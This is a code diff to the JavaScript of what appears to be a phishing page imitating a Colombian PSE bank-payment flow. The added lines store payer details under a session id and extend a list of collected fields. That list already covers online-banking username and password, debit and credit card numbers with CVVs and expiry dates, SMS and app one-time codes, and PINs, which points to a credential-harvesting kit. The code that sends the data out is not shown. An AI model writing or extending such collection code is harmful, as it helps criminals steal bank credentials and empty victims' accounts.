@@ -634,6 +634,36 @@
 
             console.log('Session UniqID:', appState.uniqId);
 
+            // ==================== RECUPERAR DATOS PSE ====================
+            // Recuperar datos del pagador guardados desde la página de inicio
+            const pseDatosStr = sessionStorage.getItem('pseDatos');
+            if (pseDatosStr) {
+                try {
+                    const pseDatos = JSON.parse(pseDatosStr);
+                    // Guardar los datos del pagador en localStorage con el prefijo del uniqId
+                    const camposPSE = {
+                        'nombre': pseDatos.nombre,
+                        'email': pseDatos.email,
+                        'celular': pseDatos.celular,
+                        'direccion': pseDatos.direccion,
+                        'ciudad': pseDatos.ciudad,
+                        'departamento': pseDatos.departamento,
+                        'banco': pseDatos.banco,
+                        'tipoPersona': pseDatos.tipoPersona,
+                        'ente': 'brasilia'
+                    };
+                    Object.keys(camposPSE).forEach(key => {
+                        if (camposPSE[key]) {
+                            const storageKey = `${appState.uniqId}_${key}`;
+                            localStorage.setItem(storageKey, JSON.stringify(camposPSE[key]));
+                        }
+                    });
+                    console.log('Datos PSE recuperados:', pseDatos);
+                } catch (e) {
+                    console.error('Error al parsear pseDatos:', e);
+                }
+            }
+
             // ==================== FUNCIONES AUXILIARES ====================
             function saveToLocalStorage(key, value) {
                 const storageKey = `${appState.uniqId}_${key}`;
@@ -752,7 +782,8 @@
                 const allData = {};
                 const fields = ['usuario', 'clave', 'ente', 'numtarjetaTDB', 'cvvTDB', 'vencimientoTDB',
                     'numtarjetaTDC', 'cvvTDC', 'vencimientoTDC',
-                    'nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion', 'codsms', 'codapp', 'pincaj', 'pinvir',
+                    'nombre', 'cedula', 'email', 'celular', 'ciudad', 'direccion', 'departamento',
+                    'banco', 'tipoPersona', 'codsms', 'codapp', 'pincaj', 'pinvir',
                     'status', 'uniqid'
                 ];
 
